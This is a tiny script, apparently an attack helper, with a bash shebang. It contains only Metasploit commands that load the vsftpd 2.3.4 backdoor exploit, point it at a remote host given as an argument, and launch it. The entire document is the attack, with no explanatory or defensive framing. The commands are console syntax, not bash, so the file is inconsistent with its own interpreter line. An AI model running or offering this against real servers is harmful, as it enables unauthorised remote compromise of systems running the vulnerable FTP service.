#!/bin/bash

use exploit/unix/ftp/vsftpd_234_backdoor

set RHOST $1

exploit
